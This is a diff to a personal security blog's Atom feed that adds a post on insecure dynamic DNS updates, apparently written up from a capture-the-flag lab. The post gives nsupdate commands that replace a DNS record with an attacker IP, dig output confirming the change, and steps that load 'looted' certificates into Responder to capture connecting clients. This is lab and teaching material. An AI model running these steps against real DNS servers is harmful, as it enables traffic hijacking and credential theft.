@@ -4,13 +4,106 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-02-25T20:16:01+08:00</updated>
+ <updated>2022-02-27T17:16:06+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Insecure Dynamic DNS Updates</title>
+   <link href="https://mvineza.github.io/spindel/2022/02/27/insecure-dynamic-dns-updates"/>
+   <updated>2022-02-27T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/02/27/Insecure-Dynamic-DNS-Updates</id>
+   <content type="html">&lt;h2 id=&quot;what-is-dynamic-dns-updates&quot;&gt;What is Dynamic DNS Updates?&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Improves management of DNS records&lt;/li&gt;
+  &lt;li&gt;For example, a new end device who receives an IP via DHCP can register itself by adding A record into the DNS&lt;/li&gt;
+  &lt;li&gt;
+    &lt;table&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;td&gt;More info: [How to configure DNS dynamic updates in Windows Server - Windows Server&lt;/td&gt;
+          &lt;td&gt;Microsoft Docs](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/configure-dns-dynamic-updates-windows-server-2003)&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/Insecure%20Dynamic%20DNS%20Updates/secure-dns.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;vulnerability&quot;&gt;Vulnerability&lt;/h2&gt;
+&lt;p&gt;An attacker can replace a record by its own IP which will force clients to connect to it.&lt;/p&gt;
+
+&lt;h2 id=&quot;steps&quot;&gt;Steps&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Delete record and replace with attacker IP &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.11.40.33&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜ nsupdate
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; server 10.10.23.72
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; update delete selfservice.windcorp.thm 
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; send
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; update add selfservice.windcorp.thm 1234 A 10.11.40.33
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; send
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; quit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Verify A record points to attacker IP&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  ra2 dig selfservice.windcorp.thm a @thm
+
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; DiG 9.16.15-Debian &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; selfservice.windcorp.thm a @thm
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; global options: +cmd
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; Got answer:
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; -&amp;gt;&amp;gt;HEADER&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;opcode&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;: QUERY, status: NOERROR, id: 57355
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4000
+;; QUESTION SECTION:
+;selfservice.windcorp.thm.	IN	A
+
+;; ANSWER SECTION:
+selfservice.windcorp.thm. 1234	IN	A	10.11.40.33
+
+;; Query time: 188 msec
+;; SERVER: 10.10.23.72#53(10.10.23.72)
+;; WHEN: Sat Sep 18 08:00:02 EDT 2021
+;; MSG SIZE  rcvd: 69
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;If you have HTTPS certificates looted from victim, put it in responder&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo cp&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;pem /usr/share/responder/certs/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Point responder config to the certs&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  scans &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/responder/Responder.conf| &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;cert
+SSLCert &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; certs/crt.pem
+SSLKey &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; certs/key.pem
+➜  scans 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Fire up responder and wait for clients to connect to you&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;responder &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; tun0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+</content>
+ </entry>
  
  <entry>
    <title>Gitlab</title>
